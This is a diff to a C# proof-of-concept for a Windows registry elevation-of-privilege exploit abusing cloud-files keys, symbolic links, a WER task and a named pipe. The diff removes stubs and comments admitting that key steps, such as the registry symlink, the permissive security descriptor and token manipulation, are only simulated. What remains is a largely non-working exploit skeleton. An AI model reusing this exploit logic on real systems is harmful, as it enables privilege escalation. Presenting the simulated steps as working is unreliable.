@@ -64,25 +64,15 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             Log(message, "INFO");
         }
 
-        // Registry operations service
-        private static void SetSecurityDescriptor(string keyPath, string securityDescriptor)
-        {
-            try
-            {
-                // Note: This is a simplified version - full security descriptor handling requires additional libraries
-                LogInfo("Setting security descriptor on " + keyPath);
-            }
-            catch (Exception ex)
-            {
-                LogError("Failed to set security descriptor on " + keyPath, ex);
-            }
-        }
-
+        // Registry operations
         private static void DeleteRegistryTree(string keyPath)
         {
             try
             {
-                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyPath, true))
+                // Remove HKEY_CURRENT_USER prefix for Registry class
+                string registryPath = keyPath.Replace(@"HKEY_CURRENT_USER\", "");
+                
+                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(registryPath, true))
                 {
                     if (key != null)
                     {
@@ -95,7 +85,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
                 }
                 
                 // Delete the key itself
-                Registry.CurrentUser.DeleteSubKeyTree(keyPath);
+                Registry.CurrentUser.DeleteSubKeyTree(registryPath);
                 LogInfo("Deleted registry tree at " + keyPath);
             }
             catch (Exception ex)
@@ -104,17 +94,11 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             }
         }
 
-        private static void CreateSymbolicLink(string source, string target)
-        {
-            // Note: Windows registry symbolic links require special APIs not available in standard .NET
-            LogInfo("Creating symbolic link from " + source + " to " + target);
-            // This would require external libraries or native API calls
-        }
-
         private static void SetValue(string keyPath, string valueName, object value)
         {
             try
             {
+                // Remove HKEY_CURRENT_USER prefix for Registry class
                 string registryPath = keyPath.Replace(@"HKEY_CURRENT_USER\", "");
                 using (RegistryKey key = Registry.CurrentUser.CreateSubKey(registryPath))
                 {
@@ -135,6 +119,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
         {
             try
             {
+                // Remove HKEY_CURRENT_USER prefix for Registry class
                 string registryPath = keyPath.Replace(@"HKEY_CURRENT_USER\", "");
                 if (recursive)
                 {
@@ -184,8 +169,6 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             {
                 for (int i = 1; i < MAX_STAGE; ++i)
                 {
-                    // Note: Win32Process is not available in standard .NET Framework
-                    // This would require Process.Start or external libraries
                     ProcessStartInfo psi = new ProcessStartInfo(typeof(Program).Assembly.Location);
                     psi.Arguments = "run";
                     psi.UseShellExecute = false;
@@ -211,9 +194,6 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             LogInfo("Stage 1: Starting");
             try
             {
-                // Note: NtThread and related APIs are not available in standard .NET
-                // This stage will need to be implemented differently or with external libraries
-                
                 // Create a thread to monitor registry changes
                 Thread checkKeyThread = new Thread(CheckKeyThread);
                 checkKeyThread.IsBackground = true;
@@ -239,9 +219,6 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
                 // Clean up registry
                 DeleteKey(CLOUD_FILES, true);
                 
-                // Create symbolic link (simulated)
-                CreateSymbolicLink(BLOCKED_APPS, TARGET_KEY);
-                
                 // Execute Stage1 (simulated)
                 Stage1(false);
                 
@@ -260,9 +237,6 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             {
                 // Clean up link
                 DeleteKey(BLOCKED_APPS, false);
-                
-                // Set security on target key (simulated)
-                SetSecurityDescriptor(TARGET_KEY, "D:(A;OICIIO;GA;;;WD)(A;OICIIO;GA;;;AN)(A;;GA;;;WD)(A;;GA;;;AN)S:(ML;OICI;NW;;;S-1-16-0)");
                 
                 // Clean up subkeys
                 string envKeyPath = TARGET_KEY.Replace(@"HKEY_CURRENT_USER\", "");
@@ -300,7 +274,6 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
                 var pipeWaitTask = srvNamedPipe.WaitForConnectionAsync();
                 
                 // Note: TaskScheduler is not available in standard .NET Framework
-                // This would require external libraries or alternative approaches
                 LogInfo("Running Windows Error Reporting task (simulated)");
                 
                 // Wait for pipe connection
@@ -346,10 +319,9 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             try
             {
                 LogInfo("Monitoring registry changes at " + path);
-                // Note: Registry monitoring would require additional implementation
+                // Simulate detection of changes
                 while (true)
                 {
-                    // Simulate detection of changes
                     Thread.Sleep(5000);
                     LogInfo("Simulated change detected in registry");
                     Environment.Exit(0);
@@ -359,28 +331,6 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             catch (Exception ex)
             {
                 LogError("Error in CheckKeyThread: " + ex.Message, ex);
-            }
-        }
-
-        private static void ForceTokenThread(object obj)
-        {
-            try
-            {
-                LogInfo("In force token thread");
-                // Note: Token manipulation requires external libraries
-                while (true)
-                {
-                    // Simulate token manipulation
-                    Thread.Sleep(1000);
-                }
-            }
-            catch (ThreadAbortException)
-            {
-                return;
-            }
-            catch (Exception ex)
-            {
-                LogError("Error in ForceTokenThread: " + ex.Message, ex);
             }
         }
 
@@ -429,7 +379,6 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
                     LogInfo("Running as SYSTEM");
                     Environment.SetEnvironmentVariable("windir", @"C:\Windows", EnvironmentVariableTarget.Process);
                     
-                    // Note: NamedPipeClientStream is available in .NET Framework
                     var namedPipeClient = new NamedPipeClientStream(PIPE_NAME);
                     namedPipeClient.Connect();
                     
@@ -443,9 +392,6 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
                     }
                     
                     namedPipeClient.Dispose();
-                    
-                    // Note: Token manipulation requires external libraries
-                    LogInfo("Token manipulation (simulated)");
                     
                     // Create process as user (simulated)
                     Process.Start(@"C:\Windows\System32\conhost.exe");
